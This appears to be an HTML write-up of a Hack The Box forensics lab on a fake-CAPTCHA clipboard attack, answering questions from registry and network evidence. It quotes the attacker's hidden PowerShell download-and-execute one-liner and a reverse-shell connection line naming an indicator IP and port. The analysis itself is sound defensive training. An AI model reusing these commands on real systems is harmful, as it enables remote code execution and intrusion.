@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Sherlock: Pikaptcha | Joan Dimas</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="../assets/css/style.css">
+</head>
+
+<body class="project-page">
+
+<div class="argus-page">
+
+  <!-- Header -->
+  <header class="argus-header">
+    <h1>Sherlock: Pikaptcha</h1>
+    <a class="back-link" href="../index.html">← Back to HTB Writeups</a>
+  </header>
+
+  <!-- Main Content -->
+  <main class="argus-content">
+
+    <h2>Overview</h2>
+    <p>
+      Happy Grunwald contacted the sysadmin, Alonzo, because of issues he had downloading the latest
+      version of Microsoft Office. He had received an email saying he needed to update, and clicked
+      the link to do it. He reported that he visited the website and solved a captcha, but no office
+      download page came back. Alonzo, who himself was bombarded with phishing attacks last year and
+      was now aware of attacker tactics, immediately notified the security team to isolate the
+      machine as he suspected an attack. You are provided with network traffic and endpoint artifacts
+      to answer questions about what happened.
+    </p>
+
+    <h2>Key Artifacts</h2>
+    <ul>
+      <li>Wireshark File (.pcap)</li>
+      <li>Registry Artifacts</li>
+    </ul>
+
+    <h2>Investigation Steps</h2>
+
+    <!-- TASK 1 -->
+    <div class="task">
+      <h3>Task 1 – Initial Payload Execution</h3>
+
+      <p><strong>Question:</strong><br>
+        It is crucial to understand any payloads executed on the system for initial access.
+        Analyzing registry hive for user <code>happy.grunwald</code>, what is the full command
+        that was run to download and execute the stager?
+      </p>
+
+      <p><strong>Answer:</strong></p>
+      <pre><code>ps -NOP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://x.x.x.x/office20x4install.ps1')"</code></pre>
+
+      <p><strong>Explanation:</strong><br>
+        While reviewing the artifacts, a <code>happy.grunwald</code> directory containing
+        <code>.dat</code> files was identified. These files were opened in Registry Explorer
+        to search for executed commands.
+      </p>
+
+      <p>
+        The command was located within the <strong>RunMRU</strong> registry key, confirming
+        the PowerShell one-liner used to download and execute the stager.
+      </p>
+
+      <ul>
+        <li>IOC IP: 43.205.115.44</li>
+        <li>Downloaded Script: Office2024install.ps1</li>
+        <li>User: grunwald</li>
+      </ul>
+
+      <p><strong>Additional Context:</strong></p>
+      <ul>
+        <li><strong>RunMRU</strong> stores the last 26 commands entered via Win + R.</li>
+        <li><strong>NTUSER.DAT</strong> contains user-specific registry data.</li>
+      </ul>
+    </div>
+
+    <!-- TASK 2 -->
+    <div class="task">
+      <h3>Task 2 – Execution Timestamp</h3>
+
+      <p><strong>Question:</strong><br>
+        At what time in UTC did the malicious payload execute?
+      </p>
+
+      <p><strong>Answer:</strong></p>
+      <pre><code>2024-09-23 05:07:45 UTC</code></pre>
+
+      <p><strong>Explanation:</strong><br>
+        The execution timestamp was identified during the analysis of registry artifacts
+        associated with the previously discovered payload execution.
+      </p>
+    </div>
+
+    <!-- TASK 3 -->
+    <div class="task">
+      <h3>Task 3 – Script Hash Identification</h3>
+
+      <p><strong>Question:</strong><br>
+        The payload initially downloaded a PowerShell script and executed it in memory.
+        What is the SHA-256 hash of the script?
+      </p>
+
+      <p><strong>Answer:</strong></p>
+      <pre><code>579284442094E1A44BEA9CFB7D8D794C8977714F827C97BCB2822A97742914DE</code></pre>
+
+      <p><strong>Explanation:</strong><br>
+        Knowing the timeline in which the activity took place, I navigated to Wireshark and
+        filtered for the IP <code>43.205.115.44</code>. Once there, I went to
+        <strong>Export Objects</strong> and found the PowerShell script.
+      </p>
+
+      <p>
+        The PowerShell script was recovered via <strong>Export Objects</strong> and hashed
+        locally using <strong>HashMyFile</strong>.
+      </p>
+    </div>
+
+    <!-- TASK 4 -->
+    <div class="task">
+      <h3>Task 4 – Reverse Shell Port</h3>
+
+      <p><strong>Question:</strong><br>
+        To which port did the reverse shell connect?
+      </p>
+
+      <p><strong>Answer:</strong></p>
+      <pre><code>6969</code></pre>
+
+      <p><strong>Explanation:</strong><br>
+        After retrieving the PowerShell script, it was reviewed to understand its behavior.
+        Much of the script was encoded and required decoding using PowerShell.
+      </p>
+
+      <pre><code>TCPClient("43.205.115.44",6969);</code></pre>
+
+      <p>
+        This confirmed a reverse shell connection to the IOC IP over port <strong>6969</strong>.
+      </p>
+    </div>
+
+    <!-- TASK 5 -->
+    <div class="task">
+      <h3>Task 5 – Reverse Shell Duration</h3>
+
+      <p><strong>Question:</strong><br>
+        For how many seconds was the reverse shell connection established between the C2
+        server and the victim workstation?
+      </p>
+
+      <p><strong>Answer:</strong></p>
+      <pre><code>403 seconds</code></pre>
+
+      <p><strong>Explanation:</strong><br>
+        Network traffic was filtered for the C2 IP address, focusing on connections to port
+        6969.
+      </p>
+
+      <ul>
+        <li>First connection: 2024-09-23 05:07:48.073971</li>
+        <li>Last connection: 2024-09-23 05:14:31.386096</li>
+      </ul>
+    </div>
+
+    <!-- TASK 6 -->
+    <div class="task">
+      <h3>Task 6 – Malicious CAPTCHA Payload</h3>
+
+      <p><strong>Question:</strong><br>
+        The attacker hosted a malicious CAPTCHA to lure users. What is the name of the
+        function containing the payload pasted into the victim’s clipboard?
+      </p>
+
+      <p><strong>Answer:</strong></p>
+      <pre><code>stageClipboard</code></pre>
+
+      <p><strong>Explanation:</strong><br>
+        HTTP traffic was analyzed prior to the PowerShell download, as the user was required
+        to visit the webpage before executing the payload.
+      </p>
+
+      <p>
+        Inspection of HTTP <strong>200 OK</strong> responses revealed the webpage source code.
+        JavaScript analysis identified a function named <code>stageClipboard</code>.
+      </p>
+
+      <p><strong>Fancy Explanation:</strong><br>
+        The attacker hosted a malicious CAPTCHA over HTTP. By analyzing HTTP responses prior
+        to payload execution, the webpage source was recovered. The function
+        <code>stageClipboard</code> copied the PowerShell payload to the victim’s clipboard,
+        enabling execution via social engineering.
+      </p>
+    </div>
+
+    <h2>Findings</h2>
+    <ul>
+      <li>
+        The user was socially engineered into executing a malicious PowerShell one-liner
+        after interacting with a fake Microsoft Office update site and CAPTCHA.
+      </li>
+      <li>
+        Registry artifacts within <code>NTUSER.DAT</code> confirmed the exact command used.
+      </li>
+      <li>
+        Network traffic revealed the downloaded PowerShell script, its hash, and a reverse
+        shell connection over TCP port <strong>6969</strong>.
+      </li>
+      <li>
+        The attacker leveraged a malicious JavaScript function,
+        <code>stageClipboard</code>, to copy the payload to the victim’s clipboard.
+      </li>
+    </ul>
+
+    <h2>Conclusion & Lessons Learned</h2>
+    <ul>
+      <li>
+        This investigation highlights how CAPTCHA lures and clipboard abuse can bypass
+        technical controls through user interaction. Defensive strategies should include
+        PowerShell restrictions, registry monitoring, and user awareness training.
+      </li>
+    </ul>
+
+  </main>
+
+</div>
+
+</body>
+</html>
